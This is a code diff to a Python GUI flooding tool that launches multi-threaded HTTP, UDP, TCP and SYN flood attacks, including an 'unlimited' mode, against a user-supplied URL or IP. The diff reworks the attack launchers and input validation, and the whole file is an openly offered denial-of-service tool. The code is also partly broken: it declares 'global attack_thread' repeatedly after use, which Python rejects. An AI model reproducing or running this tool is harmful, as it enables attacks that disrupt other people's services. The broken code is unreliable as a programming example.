@@ -15,6 +15,7 @@
 # *   software or the use or other dealings in the software.                   *
 # *                                                                           *
 # *****************************************************************************
+
 import tkinter as tk
 from tkinter import messagebox
 import requests
@@ -186,119 +187,169 @@ def attack_target_http(url, thread_count, packet_limit):
     for thread in threads:
         thread.join()
 
-def attack_target_udp(target_ip, target_port, thread_count, packet_limit):
+def attack_target_udp(ip, port, thread_count, packet_limit):
     """Start UDP attack on the target IP and port with specified threads and packet limit."""
     threads = []
     for _ in range(thread_count):
-        thread = threading.Thread(target=send_udp_packet, args=(target_ip, target_port, packet_limit))
+        thread = threading.Thread(target=send_udp_packet, args=(ip, port, packet_limit))
         threads.append(thread)
         thread.start()
     
     for thread in threads:
         thread.join()
 
-def attack_target_tcp(target_ip, target_port, thread_count, packet_limit):
+def attack_target_tcp(ip, port, thread_count, packet_limit):
     """Start TCP attack on the target IP and port with specified threads and packet limit."""
     threads = []
     for _ in range(thread_count):
-        thread = threading.Thread(target=send_tcp_connection, args=(target_ip, target_port, packet_limit))
+        thread = threading.Thread(target=send_tcp_connection, args=(ip, port, packet_limit))
         threads.append(thread)
         thread.start()
     
     for thread in threads:
         thread.join()
 
-def attack_target_syn(target_ip, target_port, packet_limit):
-    """Start SYN flood attack on the target IP and port."""
-    send_syn_flood(target_ip, target_port, packet_limit)
+def attack_target_syn(ip, port, thread_count, packet_limit):
+    """Start SYN flood attack on the target IP and port with specified threads and packet limit."""
+    threads = []
+    for _ in range(thread_count):
+        thread = threading.Thread(target=send_syn_flood, args=(ip, port, packet_limit))
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
 
 def start_attack():
     """Start the attack based on user input."""
-    global attack_running, attack_thread
-    if attack_thread and attack_thread.is_alive():
-        print("An attack is already running.")
+    global attack_running
+    attack_running = True
+    
+    url = url_entry.get().strip()
+    ip = ip_entry.get().strip()
+    threads = threads_entry.get().strip()
+    packet_limit = packet_limit_entry.get().strip()
+    attack_type = attack_type_var.get()
+    
+    if not threads.isdigit() or not packet_limit.isdigit():
+        messagebox.showerror("Invalid Input", "Number of threads and packet limit must be integers.")
         return
 
-    url = url_entry.get()
-    ip = ip_entry.get()
-    threads = int(threads_entry.get())
-    packet_limit = int(packet_limit_entry.get())
+    thread_count = int(threads)
+    packet_limit = int(packet_limit)
 
-    sanitized_url = sanitize_url(url) if url else None
-    sanitized_ip = sanitize_ip(ip) if ip else None
-    attack_type = attack_type_var.get()
-
-    def run_attack():
-        if attack_type == "HTTP" and sanitized_url:
-            print(f'Starting HTTP attack on {sanitized_url} with {threads} threads and packet limit {packet_limit}')
-            attack_target_http(sanitized_url, threads, packet_limit)
-        
-        if attack_type == "UDP" and sanitized_ip:
-            print(f'Starting UDP attack on {sanitized_ip} with {threads} threads and packet limit {packet_limit}')
-            attack_target_udp(sanitized_ip, 80, threads, packet_limit)  # Default port 80 for UDP
-        
-        if attack_type == "TCP" and sanitized_ip:
-            print(f'Starting TCP attack on {sanitized_ip} with {threads} threads and packet limit {packet_limit}')
-            attack_target_tcp(sanitized_ip, 80, threads, packet_limit)  # Default port 80 for TCP
-        
-        if attack_type == "SYN" and sanitized_ip:
-            print(f'Starting SYN flood attack on {sanitized_ip} with port 80 and packet limit {packet_limit}')
-            attack_target_syn(sanitized_ip, 80, packet_limit)
-
-    # Run the attack in a separate thread
-    attack_thread = threading.Thread(target=run_attack)
-    attack_thread.start()
+    if attack_type == "HTTP":
+        if not url:
+            messagebox.showerror("Invalid Input", "URL must be provided for HTTP attack.")
+            return
+        sanitized_url = sanitize_url(url)
+        if not sanitized_url:
+            messagebox.showerror("Invalid URL", "The provided URL is not valid.")
+            return
+        global attack_thread
+        attack_thread = threading.Thread(target=attack_target_http, args=(sanitized_url, thread_count, packet_limit))
+        attack_thread.start()
+    
+    elif attack_type == "UDP":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for UDP attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for UDP
+        global attack_thread
+        attack_thread = threading.Thread(target=attack_target_udp, args=(ip, target_port, thread_count, packet_limit))
+        attack_thread.start()
+    
+    elif attack_type == "TCP":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for TCP attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for TCP
+        global attack_thread
+        attack_thread = threading.Thread(target=attack_target_tcp, args=(ip, target_port, thread_count, packet_limit))
+        attack_thread.start()
+    
+    elif attack_type == "SYN":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for SYN flood attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for SYN flood
+        global attack_thread
+        attack_thread = threading.Thread(target=attack_target_syn, args=(ip, target_port, thread_count, packet_limit))
+        attack_thread.start()
 
 def start_unlimited_attack():
-    """Start an unlimited attack based on user input."""
-    global attack_running, attack_thread
-    if attack_thread and attack_thread.is_alive():
-        print("An attack is already running.")
-        return
-
-    url = url_entry.get()
-    ip = ip_entry.get()
-    packet_limit = int(packet_limit_entry.get())
-
-    sanitized_url = sanitize_url(url) if url else None
-    sanitized_ip = sanitize_ip(ip) if ip else None
+    """Start the unlimited attack based on user input."""
+    global attack_running
+    attack_running = True
+    
+    url = url_entry.get().strip()
+    ip = ip_entry.get().strip()
     attack_type = attack_type_var.get()
-
-    def run_unlimited_attack():
-        global attack_running
-        if attack_type == "HTTP" and sanitized_url:
-            print(f'Starting HTTP attack on {sanitized_url} with unlimited threads and packet limit {packet_limit}')
-            while attack_running:
-                attack_target_http(sanitized_url, float('inf'), packet_limit)
-                time.sleep(1)
-        
-        if attack_type == "UDP" and sanitized_ip:
-            print(f'Starting UDP attack on {sanitized_ip} with unlimited threads and packet limit {packet_limit}')
-            while attack_running:
-                attack_target_udp(sanitized_ip, 80, float('inf'), packet_limit)  # Default port 80 for UDP
-                time.sleep(1)
-
-        if attack_type == "TCP" and sanitized_ip:
-            print(f'Starting TCP attack on {sanitized_ip} with unlimited threads and packet limit {packet_limit}')
-            while attack_running:
-                attack_target_tcp(sanitized_ip, 80, float('inf'), packet_limit)  # Default port 80 for TCP
-                time.sleep(1)
-        
-        if attack_type == "SYN" and sanitized_ip:
-            print(f'Starting SYN flood attack on {sanitized_ip} with port 80 and packet limit {packet_limit}')
-            attack_target_syn(sanitized_ip, 80, packet_limit)
-
-    # Run the unlimited attack in a separate thread
-    attack_thread = threading.Thread(target=run_unlimited_attack)
-    attack_thread.start()
+    
+    if attack_type == "HTTP":
+        if not url:
+            messagebox.showerror("Invalid Input", "URL must be provided for HTTP attack.")
+            return
+        sanitized_url = sanitize_url(url)
+        if not sanitized_url:
+            messagebox.showerror("Invalid URL", "The provided URL is not valid.")
+            return
+        global attack_thread
+        attack_thread = threading.Thread(target=lambda: send_http_request(sanitized_url, float('inf')))
+        attack_thread.start()
+    
+    elif attack_type == "UDP":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for UDP attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for UDP
+        global attack_thread
+        attack_thread = threading.Thread(target=lambda: send_udp_packet(ip, target_port, float('inf')))
+        attack_thread.start()
+    
+    elif attack_type == "TCP":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for TCP attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for TCP
+        global attack_thread
+        attack_thread = threading.Thread(target=lambda: send_tcp_connection(ip, target_port, float('inf')))
+        attack_thread.start()
+    
+    elif attack_type == "SYN":
+        if not ip:
+            messagebox.showerror("Invalid Input", "IP Address must be provided for SYN flood attack.")
+            return
+        if not is_valid_ip(ip):
+            messagebox.showerror("Invalid IP", "The provided IP address is not valid.")
+            return
+        target_port = 80  # Default port for SYN flood
+        global attack_thread
+        attack_thread = threading.Thread(target=lambda: send_syn_flood(ip, target_port, float('inf')))
+        attack_thread.start()
 
 def stop_attack():
     """Stop the ongoing attack."""
-    global attack_running, attack_thread
+    global attack_running
     attack_running = False
     if attack_thread and attack_thread.is_alive():
         attack_thread.join()
-    print('Attack stopped.')
+    print("Attack has been stopped.")
 
 if __name__ == "__main__":
     create_gui()
